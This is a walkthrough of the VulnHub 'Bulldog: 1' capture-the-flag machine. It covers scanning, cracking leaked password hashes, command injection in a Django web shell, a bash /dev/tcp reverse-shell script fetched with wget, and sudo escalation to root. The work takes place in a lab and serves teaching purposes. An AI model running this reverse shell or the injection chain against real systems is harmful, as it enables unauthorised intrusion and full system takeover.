# Bulldog: 1

## 1.Get VM IP:

```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0f       (Unknown: locally administered)
192.168.56.100  08:00:27:3c:59:b7       PCS Systemtechnik GmbH
192.168.56.107  08:00:27:38:4c:8d       PCS Systemtechnik GmbH
```

The IP address is `192.168.56.107`, let's scan it.

## 2.Enumeration

```bash
root@kali: nmap -sV -sC -p- -oN nmap.out 192.168.56.107

Nmap scan report for 192.168.56.107
Host is up (0.00050s latency).

PORT     STATE SERVICE VERSION
23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)
|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)
|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)
80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
|_http-title: Bulldog Industries
|_http-server-header: WSGIServer/0.1 Python/2.7.12
8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
|_http-title: Bulldog Industries
MAC Address: 08:00:27:38:4C:8D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

port `23` is used for ssh and we now visit the web application :

![mainpage](https://github.com/Git-K3rnel/VulnHub/assets/127470407/c08d7dd9-9063-48ab-8cad-6b6738e1844f)

we try to fuzz the directories :

```bash
root@kali: gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.56.107

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 0] [--> http://192.168.56.107/admin/]
/dev                  (Status: 301) [Size: 0] [--> http://192.168.56.107/dev/]
/notice               (Status: 301) [Size: 0] [--> http://192.168.56.107/notice/]
```

visiting the `/admin` page shows a django admin panel login, but we need username and password:

![admin](https://github.com/Git-K3rnel/VulnHub/assets/127470407/13a0ccf5-917f-4ec7-9a9b-0cbdcdde5fdb)

so we go to `/dev` : 

![dev](https://github.com/Git-K3rnel/VulnHub/assets/127470407/98c856d8-e169-4fc9-9b2c-2daf686fabde)

here we see afew users mentioned at the bottom of the page, but if we see the page source we find user passwords hashes too :

![hash](https://github.com/Git-K3rnel/VulnHub/assets/127470407/fee2a848-115a-40e9-b002-823b1782c436)

we try to crack these hashes and only 2 of them is cracked, the one for user `nick` and `sarah`.

use an online resource to crack the hashes :

```text
nick  | ddf45997a7e18a25ad5f5cf222da64814dd060d5 = bulldog
sarah | d8b8dd5e7f000b8dea26ef8428caf38c04466b3e = bulldoglover
```

there is also a link in `/dev` which redirects us to `/dev/shell` and here we must first be authenticated :

![shell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/3f52cd3b-6c74-4d25-8158-f5da8909a0de)

since we found passwords of the users, try to login to `/admin` path with user nick or sarah :

![login](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f754b5c3-8af8-44dc-9f6d-9cf2e93f4ab1)

now we can go to `/dev/shell` and this page is shown :

![webshell](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2b55ef5b-1d21-411d-9251-10c8e5001961)

here we can run afew commands, but if we use `&&` we can execute another command too, so there is a command injection vulnerability here :

![injection](https://github.com/Git-K3rnel/VulnHub/assets/127470407/6bf10839-4cad-4c49-9237-266ce302abba)

so we can get a reverse shell.

## 3.Gaining Shell

I just made a file with a reverse shell payload in it and called it `shell.sh`:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
```

then served a python http server and used `wget` to download and put the file in `/dev/shm` directory of the victim :

![wget](https://github.com/Git-K3rnel/VulnHub/assets/127470407/112e8ae4-5a2e-4a00-b748-d05714c81a02)

then start a listener on your machine and just execute it with another bash command :

![bash](https://github.com/Git-K3rnel/VulnHub/assets/127470407/4ce5f34f-db6a-491d-9c66-a4149345860f)

```bash
nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.107] 41242
bash: cannot set terminal process group (963): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /root/.bashrc: Permission denied
django@bulldog:/home/django/bulldog$ id

uid=1001(django) gid=1001(django) groups=1001(django),27(sudo)

django@bulldog:/home/django/bulldog$
```

## 4.Privilege Escalation

We navigate to `/home/bulldogadmin` and see the content :

```bash
django@bulldog:/home/bulldogadmin$ ls -la
ls -la
total 40
drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Sep 21  2017 .
drwxr-xr-x 4 root         root         4096 Aug 24  2017 ..
-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24  2017 .bash_logout
-rw-r--r-- 1 bulldogadmin bulldogadmin 3771 Aug 24  2017 .bashrc
drwx------ 2 bulldogadmin bulldogadmin 4096 Aug 24  2017 .cache
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Sep 21  2017 .hiddenadmindirectory
drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 25  2017 .nano
-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24  2017 .profile
-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25  2017 .selected_editor
-rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24  2017 .sudo_as_admin_successful
-rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24  2017 .wget-hsts
```

there is a hidden directory here called `.hiddenadmindirectory` and the content is :

```bash
customPermissionApp
note
```

read the note and try to execute the `customPermissionApp` but it is not possible, so let's check the strings of it :


![password](https://github.com/Git-K3rnel/VulnHub/assets/127470407/8e8d5869-eac3-49f0-b114-0e3fd5b5b552)

put these lines together and remove the `H` from it and you will get :

```text
SUPERultimatePASSWORDyouCANTget
```

this password is used for user `django` (our current user), let's check out sudo permissions :

```bash
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo -l
sudo -l
[sudo] password for django: SUPERultimatePASSWORDyouCANTget

Matching Defaults entries for django on bulldog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User django may run the following commands on bulldog:
    (ALL : ALL) ALL
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$
```

easily we can be root on the machine :

```bash
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo /bin/bash

root@bulldog:/home/bulldogadmin/.hiddenadmindirectory# cd /root

root@bulldog:~# cat congrats.txt
cat congrats.txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

As far as I know there are two ways to get root. Can you find the other one?

Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
```

this is how you can become root on this machine :)
